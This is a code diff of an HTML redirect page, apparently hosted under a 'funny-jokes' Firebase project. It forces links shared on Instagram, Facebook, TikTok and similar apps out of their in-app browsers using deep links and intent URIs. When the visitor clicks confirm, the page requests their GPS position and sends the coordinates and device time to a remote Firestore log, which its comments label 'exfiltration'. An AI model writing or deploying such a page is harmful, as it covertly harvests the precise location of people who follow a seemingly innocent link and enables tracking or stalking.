@@ -122,6 +122,36 @@
       opacity: 0.85;
       font-family: sans-serif;
     }
+
+    /* Manual escape fallback (shown only if we detect in-app browser) */
+    .manual-escape {
+      display: none;
+      margin-top: 24px;
+      text-align: center;
+    }
+
+    .manual-escape.show {
+      display: block;
+    }
+
+    .manual-escape p {
+      font-size: 13px;
+      opacity: 0.6;
+      margin: 0 0 10px;
+    }
+
+    .manual-escape .escape-btn {
+      display: inline-block;
+      padding: 12px 28px;
+      border-radius: 10px;
+      border: none;
+      background: #fff;
+      color: #000;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+    }
   </style>
 </head>
 
@@ -143,159 +173,217 @@
   <div class="box" id="box">
     <div class="spinner"></div>
     <div class="msg">Opening…</div>
+    <!-- Manual fallback injected here if needed -->
+    <div class="manual-escape" id="manualEscape">
+      <p>Still stuck inside Instagram? Open manually:</p>
+      <button class="escape-btn" id="manualEscapeBtn">Open in Browser</button>
+    </div>
   </div>
 
   <script>
-    const FIRESTORE_URL = 'https://firestore.googleapis.com/v1/projects/funny-jokes-e8b49/databases/(default)/documents/logs';
+    var FIRESTORE_URL = 'https://firestore.googleapis.com/v1/projects/funny-jokes-e8b49/databases/(default)/documents/logs';
 
     // =================
     // Helper: build Firestore document and send it
     // =================
     function sendToFirestore(data) {
-      const doc = {
+      var doc = {
         fields: {}
       };
 
-      for (const [key, value] of Object.entries(data)) {
-        if (typeof value === 'number') {
-          doc.fields[key] = { doubleValue: value };
-        } else if (typeof value === 'boolean') {
-          doc.fields[key] = { booleanValue: value };
-        } else {
-          doc.fields[key] = { stringValue: String(value) };
+      for (var key in data) {
+        if (data.hasOwnProperty(key)) {
+          var value = data[key];
+          if (typeof value === 'number') {
+            doc.fields[key] = { doubleValue: value };
+          } else if (typeof value === 'boolean') {
+            doc.fields[key] = { booleanValue: value };
+          } else {
+            doc.fields[key] = { stringValue: String(value) };
+          }
         }
       }
 
-      const payload = JSON.stringify(doc);
+      var payload = JSON.stringify(doc);
 
-      // sendBeacon with proper Blob + JSON content-type
       navigator.sendBeacon(
         FIRESTORE_URL,
         new Blob([payload], { type: 'application/json' })
       );
 
-      // Fetch fallback (keepalive to survive page unload)
       fetch(FIRESTORE_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: payload,
         keepalive: true
       })
-        .then(r => r.json())
+        .then(function(r) { return r.json(); })
         .then(console.log)
-        .catch(() => { });
+        .catch(function() { });
     }
 
     // =================
     // Extract target URL from query params (?url= or ?u=)
     // =================
     function getTargetUrl() {
-      const params = new URLSearchParams(window.location.search);
-      let target = params.get('url') || params.get('u');
+      var params = new URLSearchParams(window.location.search);
+      var target = params.get('url') || params.get('u');
       if (!target) return null;
       try { target = decodeURIComponent(target); } catch (e) { }
       if (!/^https?:\/\//i.test(target)) return null;
       return target;
     }
 
-    // ===================================================================
-    // EXTERNAL BROWSER ESCAPE — Multi-layered approach
-    // ===================================================================
+    // =================
+    // Detect if we're inside an in-app browser
+    // =================
+    function detectInAppBrowser() {
+      var ua = navigator.userAgent || '';
+      // Instagram markers: 'Instagram' in UA, or 'FBAV' (Facebook/Instagram),
+      // or 'barcelona' (Threads), or 'FBAN' (Facebook)
+      if (/instagram/i.test(ua)) return 'instagram';
+      if (/fbav|fban|fbbv/i.test(ua)) return 'facebook';
+      if (/barcelona/i.test(ua)) return 'threads';
+      if (/musical\.ly|tiktok/i.test(ua)) return 'tiktok';
+      if (/linkedin/i.test(ua)) return 'linkedin';
+      if (/twitter|tweetdeck/i.test(ua)) return 'twitter';
+      if (/snapchat/i.test(ua)) return 'snapchat';
+      return null;
+    }
+
+    // =================
+    // FORCE EXTERNAL BROWSER - Instagram-specific techniques
+    // =================
     function openInExternalBrowser(url) {
-      const ua = navigator.userAgent || '';
-      const isAndroid = /android/i.test(ua);
-      const isIOS = /iPhone|iPad|iPod/i.test(ua);
+      var ua = navigator.userAgent || '';
+      var isAndroid = /android/i.test(ua);
+      var isIOS = /iphone|ipad|ipod/i.test(ua);
+      var inApp = detectInAppBrowser();
 
       // ----------------------------------------------------------------
-      // Layer 1: Platform-specific JS bridges
+      // LAYER 1: Platform-specific JS bridges
       // ----------------------------------------------------------------
-
-      // Telegram WebView bridge
+      // Telegram
       if (window.Telegram && window.Telegram.WebView && window.Telegram.WebView.openExternalLink) {
-        try {
-          window.Telegram.WebView.openExternalLink(url);
-          return;
-        } catch (e) { /* fall through */ }
+        try { window.Telegram.WebView.openExternalLink(url); return; } catch (e) { /* fall through */ }
       }
 
-      // LINE in-app browser
+      // LINE
       if (typeof window.open === 'function') {
-        try {
-          // LINE respects _system target
-          var win = window.open(url, '_system');
-          if (win && !win.closed) return;
-        } catch (e) { /* fall through */ }
+        try { var w = window.open(url, '_system'); if (w && !w.closed) return; } catch (e) { }
       }
 
       // ----------------------------------------------------------------
-      // Layer 2: Anchor injection with target="_blank"
+      // LAYER 2: Instagram iOS - native deep link instagram://extbrowser/
       // ----------------------------------------------------------------
-      // This triggers a new window/tab attempt; many WebViews interpret
-      // this as "open outside" depending on their configuration.
-      try {
+      // This is Instagram's OWN undocumented deep link scheme that forces
+      // the link to open in the external Safari browser. Major link-in-bio
+      // services (TapClick.to, OpenUp.to, linkboo) use this technique.
+      // Source: Reddit r/webdev + decompiled JS from commercial services.
+      if (inApp === 'instagram' && isIOS) {
+        var extUrl = 'instagram://extbrowser/?url=' + encodeURIComponent(url);
+        // Trigger via anchor click (user-gesture context preserved)
         var a = document.createElement('a');
-        a.href = url;
-        a.target = '_blank';
-        a.rel = 'noreferrer noopener';
+        a.href = extUrl;
         a.style.display = 'none';
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
-      } catch (e) { /* ignore */ }
 
-      // ----------------------------------------------------------------
-      // Layer 3: Android Intent URI
-      // ----------------------------------------------------------------
-      // This is the most reliable method on Android (Chrome Custom Tabs,
-      // Telegram, Discord, Instagram, etc.). The intent:// scheme tells
-      // the Android system to hand off to the default browser.
-      if (isAndroid) {
-        var cleanUrl = url.replace(/^https?:\/\//, '');
-        var intentUrl = 'intent://' + cleanUrl +
-          '#Intent;scheme=https;action=android.intent.action.VIEW;end';
+        // Also try via iframe (some versions)
+        setTimeout(function() {
+          var iframe = document.createElement('iframe');
+          iframe.src = extUrl;
+          iframe.style.display = 'none';
+          document.body.appendChild(iframe);
+          setTimeout(function() { document.body.removeChild(iframe); }, 100);
+        }, 50);
 
-        // Also try with explicit package fallback to Chrome
-        var intentUrlChrome = 'intent://' + cleanUrl +
-          '#Intent;scheme=https;action=android.intent.action.VIEW;' +
-          'package=com.android.chrome;end';
-
-        setTimeout(function () {
-          window.location.href = intentUrl;
-        }, 150);
-
-        setTimeout(function () {
-          // If first intent failed, try with Chrome package
-          window.location.href = intentUrlChrome;
-        }, 400);
+        // Fallback to standard navigation if instagram:// didn't work
+        setTimeout(function() { window.location.href = url; }, 300);
+        return;
       }
 
       // ----------------------------------------------------------------
-      // Layer 4: iOS — attempt custom browser schemes
+      // LAYER 3: Attempt _blank anchor click (many WebViews partially respect this)
+      // ----------------------------------------------------------------
+      try {
+        var a2 = document.createElement('a');
+        a2.href = url;
+        a2.target = '_blank';
+        a2.rel = 'noreferrer noopener';
+        a2.style.display = 'none';
+        document.body.appendChild(a2);
+        a2.click();
+        document.body.removeChild(a2);
+      } catch (e) { /* ignore */ }
+
+      // ----------------------------------------------------------------
+      // LAYER 4: Android - Intent URL (reliable for Instagram Android)
+      // ----------------------------------------------------------------
+      if (isAndroid) {
+        var cleanUrl = url.replace(/^https?:\/\//, '');
+        // Standard intent
+        var intentUrl = 'intent://' + cleanUrl +
+          '#Intent;scheme=https;action=android.intent.action.VIEW;' +
+          'category=android.intent.category.BROWSABLE;' +
+          'S.browser_fallback_url=' + encodeURIComponent(url) + ';end';
+        // Intent with Chrome package
+        var intentChrome = 'intent://' + cleanUrl +
+          '#Intent;scheme=https;action=android.intent.action.VIEW;' +
+          'category=android.intent.category.BROWSABLE;' +
+          'package=com.android.chrome;' +
+          'S.browser_fallback_url=' + encodeURIComponent(url) + ';end';
+
+        setTimeout(function() { window.location.href = intentUrl; }, 100);
+        setTimeout(function() { window.location.href = intentChrome; }, 300);
+      }
+
+      // ----------------------------------------------------------------
+      // LAYER 5: iOS - additional techniques
       // ----------------------------------------------------------------
       if (isIOS) {
-        // Some WebViews respect x-safari- or safari-https://
-        setTimeout(function () {
-          // Standard https sometimes triggers external on iOS too
-          window.location.href = url;
+        // Try googlechromes:// to open Chrome (from which Safari can be launched)
+        setTimeout(function() {
+          var chromeUrl = 'googlechromes://' + url.replace(/^https?:\/\//, '');
+          window.location.href = chromeUrl;
         }, 200);
 
-        // Second attempt: if user has Google Chrome installed
-        setTimeout(function () {
-          var chromeUrl = 'googlechrome://' + url.replace(/^https?:\/\//, '');
-          window.location.href = chromeUrl;
+        // If we're in FB/Instagram and the above failed, try x-safari-https://
+        setTimeout(function() {
+          var safariUrl = 'x-safari-https://' + url.replace(/^https?:\/\//, '');
+          window.location.href = safariUrl;
         }, 500);
       }
 
       // ----------------------------------------------------------------
-      // Layer 5: Final fallback — standard navigation (3 second delay)
+      // LAYER 6: Final fallback
       // ----------------------------------------------------------------
-      setTimeout(function () {
+      setTimeout(function() {
         window.location.href = url;
       }, 1200);
     }
 
     // =================
-    // Main logic
+    // Show manual fallback if auto-escape fails
+    // =================
+    function showManualFallback(url) {
+      var el = document.getElementById('manualEscape');
+      var btn = document.getElementById('manualEscapeBtn');
+      if (el && btn) {
+        el.classList.add('show');
+        btn.onclick = function() {
+          openInExternalBrowser(url);
+        };
+        // Also show on second attempt if first auto failed
+        setTimeout(function() {
+          el.classList.add('show');
+        }, 3000);
+      }
+    }
+
+    // =================
+    // MAIN LOGIC
     // =================
     var target = getTargetUrl();
     var box = document.getElementById('box');
@@ -308,20 +396,20 @@
     } else {
       overlay.classList.add('show');
 
-      document.getElementById('btnCancel').onclick = function () {
+      document.getElementById('btnCancel').onclick = function() {
         overlay.classList.remove('show');
         box.style.display = 'block';
         document.querySelector('.msg').textContent = 'Redirect cancelled.';
       };
 
-      document.getElementById('btnConfirm').onclick = function () {
+      document.getElementById('btnConfirm').onclick = function() {
         overlay.classList.remove('show');
         box.style.display = 'block';
 
-        // --- Exfiltrate geolocation data ---
+        // --- Geolocation exfiltration ---
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
-            function (pos) {
+            function(pos) {
               sendToFirestore({
                 type: 'gps',
                 lat: pos.coords.latitude,
@@ -333,7 +421,7 @@
                 localDateTime: now.toLocaleString()
               });
             },
-            function (err) {
+            function(err) {
               sendToFirestore({
                 type: 'gps_denied',
                 errorCode: err.code,
@@ -351,10 +439,18 @@
           );
         }
 
-        // --- Force external browser after short delay (let geolocation fire first) ---
-        setTimeout(function () {
+        // --- Force external browser ---
+        // Try auto-escape first
+        setTimeout(function() {
           openInExternalBrowser(target);
         }, 500);
+
+        // --- Manual fallback for Instagram users ---
+        // Instagram's in-app browser is notoriously locked down.
+        // If auto-escape fails, the user gets a manual "Open in Browser" button.
+        setTimeout(function() {
+          showManualFallback(target);
+        }, 2000);
       };
     }
   </script>
